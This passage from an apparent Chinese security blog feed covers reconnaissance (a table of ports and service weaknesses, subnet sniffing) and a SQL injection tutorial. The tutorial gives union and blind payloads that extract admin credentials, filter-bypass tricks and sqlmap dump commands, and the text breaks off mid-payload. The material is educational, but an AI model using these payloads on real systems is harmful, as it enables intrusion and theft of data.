3690</td><td>SVN</td><td>svn泄露,未授权访问</td></tr><tr><td>tcp 4848</td><td>GlassFish</td><td>弱口令</td></tr><tr><td>tcp 5000</td><td>Sybase/DB2</td><td>爆破,注入</td></tr><tr><td>tcp 5432</td><td>PostgreSQL</td><td>爆破,注入,弱口令</td></tr><tr><td>tcp 5900,5901,5902</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>cp 5984</td><td>CouchDB</td><td>未授权导致的任意指令执行</td></tr><tr><td>tcp 6379</td><td>Redis</td><td>可尝试未授权访问,弱口令爆破</td></tr><tr><td>tcp 7001,7002</td><td>WebLogic</td><td>Java反序列化,弱口令</td></tr><tr><td>tcp 7778</td><td>Kloxo</td><td>主机面板登录</td></tr><tr><td>tcp 8000</td><td>Ajenti</td><td>弱口令</td></tr><tr><td>tcp 8443</td><td>Plesk</td><td>弱口令</td></tr><tr><td>tcp 8069</td><td>Zabbix</td><td>远程执行,SQL注入</td></tr><tr><td>tcp 8080-8089</td><td>Jenkins,JBoss</td><td>反序列化,控制台弱口令</td></tr><tr><td>tcp 9080-9081,9090</td><td>WebSphere</td><td>Java反序列化,弱口令</td></tr><tr><td>tcp 9200,9300</td><td>ElasticSearch</td><td>远程执行</td></tr><tr><td>tcp 11211</td><td>Memcached</td><td>未授权访问</td></tr><tr><td>tcp 27017,27018</td><td>MongoDB</td><td>爆破,未授权访问</td></tr><tr><td>tcp 50070,50030</td><td>Hadoop</td><td>默认端口未授权访问</td></tr></tbody></table><p>PS：个人感觉8888端口也比较容易出现管理后台，可以尝试弱口令爆破一波</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap是一个网络连接端口扫描软件，用来扫描网上电脑开放的网络连接端口。确定哪些服务运行在哪些连接端口，并且推断计算机运行哪个操作系统。它是网络管理员必用的软件之一，以及用以评估网络系统安全。<br>功能:<br>1、 主机发现<br>2、 端口扫描<br>3、 版本侦测<br>4、 OS侦测</p><h2 id="旁站C段查询"><a href="#旁站C段查询" class="headerlink" title="旁站C段查询"></a>旁站C段查询</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。</p><p>旁注：通过入侵安全性较差的旁站，之后可以通过提权跨目录等手段拿到目标服务器的权限。</p><p>工具：K8_C段旁注工具、WebRobot、御剑、明小子 …</p><p>C段：每个IP有ABCD四个段，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务。比如192.168.3.0-255的设备都处于同一个c段。</p><p>C段入侵：目标ip为192.168.1.128，可以入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。</p><p>工具：Cain、Sniffit 、Snoop、Tcpdump、Dsniff …</p><h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><p>Web敏感文件<br>robots.txt、crossdomin.xml、sitemap.xml、源码泄漏文件 …</p><p>WAF信息<br>WAF识别大多基于Headers头信息，还可以使用Wafw00f，Sqlmap的waf脚本，Nmap的http-waf-detect和http-waf-fingerprint脚本等等。</p><p>相关漏洞<br>漏洞查询站点：exploitdb、hackerone、CNVD、0day5、乌云漏洞库镜像站 …</p><h3 id="版权声明：本文为CSDN博主「lowhacker」的原创文章，修改搬运而来"><a href="#版权声明：本文为CSDN博主「lowhacker」的原创文章，修改搬运而来" class="headerlink" title="版权声明：本文为CSDN博主「lowhacker」的原创文章，修改搬运而来"></a>版权声明：本文为CSDN博主「lowhacker」的原创文章，修改搬运而来</h3><h3 id="原文链接：https-blog-csdn-net-lowhacker-article-details-89449701"><a href="#原文链接：https-blog-csdn-net-lowhacker-article-details-89449701" class="headerlink" title="原文链接：https://blog.csdn.net/lowhacker/article/details/89449701"></a>原文链接：<a href="https://blog.csdn.net/lowhacker/article/details/89449701">https://blog.csdn.net/lowhacker/article/details/89449701</a></h3>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;搜索引擎&quot;&gt;&lt;a href=&quot;#搜索引擎&quot; class=&quot;headerlink&quot; title=&quot;搜索引擎&quot;&gt;&lt;/a&gt;搜索引擎&lt;/h2&gt;&lt;h3 id=&quot;1-Google-hacking&quot;&gt;&lt;a href=&quot;#1-Google-hacking&quot; class=&quot;headerlink&quot; title=&quot;1.Google hacking&quot;&gt;&lt;/a&gt;1.Google hacking&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;常用搜索语法：&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;intitle:KEYWORD //搜索网页标题中含有关键词的网页&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;intext:KEYWORD //搜索站点正文中含有关键词的网页&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;inurl:KEYWORD //搜索URL中包含有指定字符串的网址&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;inurl:php?id= //搜索PHP网页&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;site:DOMAIN //在指定站点内查找相关的内容&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;filetype:FILE //搜索指定类型的文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们可以同时附加多个条件进行筛选，比如 inurl:admin intitle:农具&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;两个筛选条件之间用空格隔开&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://yun421.top/2021/04/16/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yun421.top/2021/04/16/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-04-16T13:27:08.000Z</published>
    <updated>2022-03-04T09:36:24.817Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># SQL注入<h2 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h2><p>动态交互网站，实现交互利用用户输入<strong>拼接到SQL执行</strong>，输入不同导致返回结果不同。用户输入内容没有经过完美处理，而且构造SQL语句，直接将构造的SQL语句带入SQL语句中执行，导致SQL注入漏洞。<span id="more"></span></p><p> Burpsuite repeater模块中空格用‘+’或者‘%20’代替</p><p>SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> admin <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span><span class="number">1</span> #<span class="string">&#x27;and password = &#x27;</span>password<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>（执行到#前语句结束）</p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736104.png" alt="image-20210406164151516"></p><h2 id="SQL注入类型分类"><a href="#SQL注入类型分类" class="headerlink" title="SQL注入类型分类"></a>SQL注入类型分类</h2><p>用户输入的数据为<strong>数字、字符</strong>两种。</p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736105.png" alt="image-20210406170058910"></p><h2 id="SQL注入出现的位置"><a href="#SQL注入出现的位置" class="headerlink" title="SQL注入出现的位置"></a>SQL注入出现的位置</h2><p>存在于用户可控输入范围</p><p>1.URL提交的参数</p><p>2.HTTP请求主体（POST提交的数据）</p><p>3.HTTP请求头（User-Agent、Referer、Cookie等）</p><p>以上输入位置只要提交的数据未能完美处理，被带入SQL执行，就存在SQL注入漏洞。</p><h2 id="SQL注入利用"><a href="#SQL注入利用" class="headerlink" title="SQL注入利用"></a>SQL注入利用</h2><p>1.获取数据库信息（脱裤）</p><p>2.获取系统命令执行shell</p><p>3.上传或下载服务器文件（webshell）等</p><h2 id="SQL注入漏洞利用方式分类"><a href="#SQL注入漏洞利用方式分类" class="headerlink" title="SQL注入漏洞利用方式分类"></a>SQL注入漏洞利用方式分类</h2><p>1.<a href="Union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">联合注入</a></p><p>2.<a href="%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">布尔盲注</a></p><p>3.延时盲注</p><p>4.报错注入</p><h3 id="Union联合注入"><a href="#Union联合注入" class="headerlink" title="Union联合注入"></a>Union联合注入</h3><p><strong>注意：union联合查询注入利用只适用于页面中有返回结果的SQL语句查询</strong></p><p>在SQL语句中查询数据时，使用select相关语句与where条件子句筛选符合条件的记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p> #在person表中筛选出id=1的记录</p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736107.png" alt="image-20210406172121060"></p><p><strong>判断联合查询语句中的字段数时，可以使用order by num。当依次增大num时，如果出现错误，那么该条SQL查询语句的结果字段数就为num-1</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736108.png" alt="image-20210406172958431"></p><h4 id="1-执行联合查询"><a href="#1-执行联合查询" class="headerlink" title="1.执行联合查询"></a>1.执行联合查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736109.png" alt="image-20210406173352068"></p><h4 id="2-查询数据库名、版本号、用户信息"><a href="#2-查询数据库名、版本号、用户信息" class="headerlink" title="2.查询数据库名、版本号、用户信息"></a>2.查询数据库名、版本号、用户信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database(),version(),<span class="keyword">user</span>();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736110.png" alt="image-20210406173406295"></p><h4 id="3-查询数据表名"><a href="#3-查询数据表名" class="headerlink" title="3.查询数据表名"></a>3.查询数据表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736111.png" alt="image-20210406174232613"></p><h4 id="4-查询字段名"><a href="#4-查询字段名" class="headerlink" title="4.查询字段名"></a>4.查询字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E</span>),<span class="number">4</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736112.png" alt="image-20210406174917938"></p><h4 id="5-查询具体数据"><a href="#5-查询具体数据" class="headerlink" title="5.查询具体数据"></a>5.查询具体数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,concat(username,<span class="number">0x5c</span>,password),<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> admin;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,concat(username,<span class="number">0x5c</span>,password),<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> admin limit <span class="number">0</span>，<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p><strong>0x5c为分隔符</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736113.png" alt="image-20210406175301521"></p><h5 id="Burpsuite字符型联合注入利用"><a href="#Burpsuite字符型联合注入利用" class="headerlink" title="Burpsuite字符型联合注入利用"></a>Burpsuite字符型联合注入利用</h5><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736114.png" alt="image-20210406180820320"></p><p><strong>Mysql中注释符：#、–+ 闭合引号</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>        <span class="comment">--+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>      注入语句                 <span class="comment">--+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>      注入语句             <span class="keyword">or</span> <span class="string">&#x27;1     &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> articles <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>      注入语句             <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="过滤联合注入绕过技巧"><a href="#过滤联合注入绕过技巧" class="headerlink" title="过滤联合注入绕过技巧"></a>过滤联合注入绕过技巧</h4><p><strong>联合注入不适用情形：</strong></p><p><strong>1.union关键字被完全过滤</strong></p><p><strong>2.页面中压根不返回查询数据</strong></p><h5 id="PHP中常用的过滤函数"><a href="#PHP中常用的过滤函数" class="headerlink" title="PHP中常用的过滤函数"></a>PHP中常用的过滤函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace(*find,replace,<span class="keyword">string</span>,count*)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的值。</td></tr><tr><td align="left"><em>replace</em></td><td align="left">必需。规定替换 <em>find</em> 中的值的值。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>count</em></td><td align="left">可选。一个变量，对替换数进行计数。</td></tr></tbody></table><table><thead><tr><th align="left">返回值：</th><th>返回带有替换值的字符串或数组。</th></tr></thead><tbody><tr><td align="left"><strong>PHP 版本：</strong></td><td><strong>4+</strong></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span>)</span><br></pre></td></tr></table></figure><p>如果 subject 是一个数组，preg_replace() 返回一个数组，其他情况下返回一个字符串。</p><p>如果pattern被查找到，替换subject后返回，其他情况下，返回没有改变的subject。如果发生错误返回 NULL。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="variable">$pattern</span>,<span class="variable">$subject</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/php/i</span><br></pre></td></tr></table></figure><p>//模式分隔符后的”i”标记这是一个大小写不敏感的搜索</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\bweb\b/i</span><br></pre></td></tr></table></figure><p>/* 模式中的\b标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配单词的部分内容，比如”webbing” 或 “cobweb” */    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@^(?:http:<span class="comment">//)?([^/]+)@i</span></span><br></pre></td></tr></table></figure><p>//从URL中获取主机名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[^.]+\.[^.]+$/</span><br></pre></td></tr></table></figure><p>//获取主机名称的后面两部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(?P&lt;name&gt;\w+): (?P&lt;digit&gt;\d+)/</span><br></pre></td></tr></table></figure><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p><strong>在Mysql中，大小写字母含义一致。如果在进行过滤提交的数据过程中，没有对大小写进行区分，那么此时就会造成大小写绕过过滤的情况。</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736115.png" alt="image-20210406210119840"></p><p>都只匹配或过滤union，但是没有过滤大写字母，可以使用大小写绕过，如Union</p><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p><strong>使用preg_replace函数过程中，默认情况只进行一次匹配。因此如果匹配到字符替换为空的情况，就可以造成双写绕过。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = preg_replace(<span class="string">&#x27;/union|sleep|benchmark|floor/i&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>过滤了大小写，但是字符替换为空，可以使用双写绕过，如uniunionon</p><h5 id="过滤单引号绕过-十六进制"><a href="#过滤单引号绕过-十六进制" class="headerlink" title="过滤单引号绕过 十六进制"></a>过滤单引号绕过 十六进制</h5><p><strong>Mysql数据库中的SQL语句，对于字符串数据必须使用引号。但是对于字符串来说，Mysql也识别字符串中每个字符对应的ASCII码的16进制，此时可以使用0x16进制替换字符串来绕过引号对字符串的限制。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes()函数在预定义字符之前添加反斜杠并返回字符串</span><br></pre></td></tr></table></figure><p>预定义字符是：</p><p>单引号(‘)</p><p>双引号(“)</p><p>反斜杠(\)</p><p>NULL</p><p>或者在php.ini配置文件中开启magic_quotes_gpc选项，此时对数字型注入来说，如果需要进行数据库中数据获取，需要使用十六进制绕过。对于字符型注入来说，需要进行逃逸引号的操作（即宽字节注入）。</p><h5 id="宽字节注入原理与利用"><a href="#宽字节注入原理与利用" class="headerlink" title="宽字节注入原理与利用"></a>宽字节注入原理与利用</h5><p><strong>如果数据库中存储数据使用的编码方式是GBK，那么由于用户输入的内容会进行双字节组合，会导致用户输入的字节与反斜杠结合，从而逃逸引号。</strong></p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736116.png" alt="image-20210406213141234"></p><p><strong>无法使用联合查询注入利用方式：preg_match(‘/union/i,$sql’)，完全过滤。</strong></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p><strong>1.WAF或者过滤函数完全过滤掉union关键字</strong></p><p><strong>2.页面中不再回显具体数据，但是在SQL语句执行成功或失败返回不同的内容</strong></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>利用逻辑关系对SQL语句进行干预，例如select * from article where id = 1 and 1=1恒为真，输出正确情况。如果拼接and 1=2恒为假，输出错误情况。</strong></p><p><strong>比较返回结果，复杂的可以用Burpsuite页面比较</strong></p><h4 id="1-获取数据库名称"><a href="#1-获取数据库名称" class="headerlink" title="1.获取数据库名称"></a>1.获取数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and+length(database())&gt;=num #根据页面返回长度判断数据库长度</span><br><span class="line">and+substr(database(),1,1)=&#x27;a&#x27; #逐字遍历(替换a) #substr substring mid 都可以截取字符串其中一部分 如果过滤引号，可以适用 and+ascii(substr(database(),1,1)) = 96 #根据ascii值判断 ord 也可以实现遍历数据库长度的字符，最终找到数据名称。</span><br></pre></td></tr></table></figure><h4 id="2-获取数据表名称"><a href="#2-获取数据表名称" class="headerlink" title="2.获取数据表名称"></a>2.获取数据表名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(select table_name from information_schema.tables where table_schema=&#x27;web_sql(转化为16进制)&#x27; limit 2,1),1,1) = 96</span><br><span class="line">其中 limit m,n m为起始位置，n为长度。 limit 0，1获取第一个数据。</span><br></pre></td></tr></table></figure><h4 id="3-获取字段名称"><a href="#3-获取字段名称" class="headerlink" title="3.获取字段名称"></a>3.获取字段名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(select column_name from information_schenma.columns where table_name=&#x27;web_sql&#x27; limit 2,1),1,1) = 96</span><br></pre></td></tr></table></figure><h4 id="4-获取数值部分"><a href="#4-获取数值部分" class="headerlink" title="4.获取数值部分"></a>4.获取数值部分</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(group_concat(select 字段 from 表名),1,1)) = 96</span><br></pre></td></tr></table></figure><h4 id="sqlmap对注入点进行自动化布尔注入"><a href="#sqlmap对注入点进行自动化布尔注入" class="headerlink" title="sqlmap对注入点进行自动化布尔注入"></a>sqlmap对注入点进行自动化布尔注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap中的 --technique</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url&quot; --technique B 布尔注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url&quot; --technique B --dbs 获取数据库名称</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url&quot; --technique B -D 库名 --tables 获取数据表名</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url&quot; --technique B -D 库名 --T 表名 --columns 获取字段名</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url&quot; --technique B -D 库名 --T 表名 --C &quot;字段名&quot; --dump</span><br></pre></td></tr></table></figure><h4 id="布尔盲注过滤绕过技巧（不止用于布尔盲注）"><a href="#布尔盲注过滤绕过技巧（不止用于布尔盲注）" class="headerlink" title="布尔盲注过滤绕过技巧（不止用于布尔盲注）"></a>布尔盲注过滤绕过技巧（不止用于布尔盲注）</h4><p><strong>绕过核心就是将布尔利用技术中的关键字进行替换</strong><br><strong>and ord(mid(select table_name from information_schema.tables where table_schema=’web_sql’ limit 2,1),1,1) = 96</strong></p><h5 id="1-过滤逗号绕过技巧"><a href="#1-过滤逗号绕过技巧" class="headerlink" title="1.过滤逗号绕过技巧"></a>1.过滤逗号绕过技巧</h5><p><strong>进行盲注过程中，可能需要substr(),mid(),limit等函数或操作符，此时要用到逗号。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mid(username,1,1) 等价于 mid(username from 1 for 1)</span><br><span class="line"></span><br><span class="line">substr(username,1,1) 等价于 substr(username from 1 for 1)</span><br><span class="line"></span><br><span class="line">select * from admin limit 1,1 等价于 select * from admin limit 1 offset 1;</span><br></pre></td></tr></table></figure><h5 id="2-过滤比较运算符技巧"><a href="#2-过滤比较运算符技巧" class="headerlink" title="2.过滤比较运算符技巧"></a>2.过滤比较运算符技巧</h5><p><strong>进行盲注过程中，需要使用大于或小于比较运算符。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">greatest(n1,n2,n3...)：返回n中的最大值</span><br><span class="line">greatest(ascii(substr(username,1,1)),1)=96;</span><br><span class="line">least(n1,n2,n3...):返回n中的最小值</span><br><span class="line">strcmp(str1,str2):若所有的字符串均相同，则返回0,若根据当前分类次序，第一个参数小于第二个，则返回-1，其它情况返回1</span><br><span class="line">substr(username,1,1) in (&#x27;t&#x27;);</span><br><span class="line">between a and b:范围在a-b之间</span><br><span class="line">and substr(username,1,1) between &#x27;a&#x27; and &#x27;t&#x27;; </span><br></pre></td></tr></table></figure><h4 id="布尔盲注CTF解题方法"><a href="#布尔盲注CTF解题方法" class="headerlink" title="布尔盲注CTF解题方法"></a>布尔盲注CTF解题方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.确定注入点</span><br><span class="line">2.对注入点测试，获取原始注入利用语句</span><br><span class="line">3.Python编写代码自动化注入</span><br></pre></td></tr></table></figure><p><strong>注入点id 使用and 1=1 和and 1=2 由于过滤and 无法探测出是否存在sql注入。and被过滤可以使用&amp;&amp;替换</strong></p><p>ps:<strong>&amp;符号在burpsuite中要使用URL编码%26</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">or</span> ord(mid(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">in</span> (database()) limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>) <span class="keyword">in</span> (<span class="number">97</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span>ord(mid(<span class="keyword">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span 